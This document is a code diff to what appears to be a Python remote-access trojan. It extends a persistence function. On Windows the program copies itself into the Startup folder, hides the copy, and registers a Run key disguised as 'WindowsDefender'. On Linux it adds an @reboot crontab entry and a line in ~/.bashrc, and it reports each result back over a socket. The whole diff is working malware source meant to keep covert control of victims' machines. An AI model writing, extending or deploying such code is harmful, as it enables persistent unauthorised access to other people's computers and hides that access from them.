@@ -125,29 +125,49 @@ def handle_shell(sock):
 
 def persistance(sock):
     try:
+        f_path = os.path.abspath(sys.argv[0])
+
         if arc.lower() == "windows":
-            su_path = os.path.join(
-                os.getenv('APPDATA'),'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
-            f_path = os.path.abspath(sys.argv[0])
+            su_path = os.path.join(os.getenv('APPDATA'),'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
             f_name = os.path.basename(f_path)
-            targ_path = os.path.join(su_path, f_name)
-            os.system(f'attrib +h "{targ_path}"')
-            if not os.path.exists(targ_path):
-                    shutil.copy2(f_path, targ_path)
-            if os.path.exists(targ_path):
+            t_path = os.path.join(su_path, f_name)
+            if not os.path.exists(t_path):
+                    shutil.copy2(f_path, t_path)
+            if os.path.exists(t_path):
+                os.system(f'attrib +h "{t_path}"')
                 send(sock, b"[+] Windows startup persistence succeeded")
             
             reg_key = r"Software\Microsoft\Windows\CurrentVersion\Run"
             try:
                 key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_key, 0, winreg.KEY_SET_VALUE)
-                winreg.SetValueEx(key, "WindowsDefender", 0, winreg.REG_SZ, targ_path)
+                winreg.SetValueEx(key, "WindowsDefender", 0, winreg.REG_SZ, t_path)
                 winreg.CloseKey(key)
                 send(sock, f"[+] Registry persistence succeeded".encode())
             except Exception as reg_error:
                 send(sock, f"[!] Registry persistence failed: {reg_error}".encode())
         elif arc.lower() == "linux":
-            print("linux logic")
-        
+            try:
+                #method1
+                cron_entry = f"@reboot /usr/bin/python3 {f_path} &\n"
+                cron_file = "/tmp/.cron_job"
+
+                with open(cron_file, "w") as f:
+                    f.write(cron_entry)
+                os.system(f"crontab {cron_file} && rm {cron_file}")
+                send(sock, b"[+] Added to user crontab")
+            except Exception as e:
+                send(sock, f"[!] crontab persistence failed: {e}".encode())
+            try:
+                #method2
+                rc_file = os.path.expanduser("~/.bashrc")
+                with open(rc_file, "a") as f:
+                    f.write(f"\n# {os.path.basename(sys.argv[0])}\n")
+                    f.write(f"{os.path.abspath(sys.argv[0])} &\n")
+                send(sock, b"[+] Added to shell rc file")
+
+            except Exception as e:
+                send(sock, f"[!] bashrc persistence failed: {e}".encode())
+
     except Exception as e:
         send(sock, f"Persistence failed: {e}".encode())
 
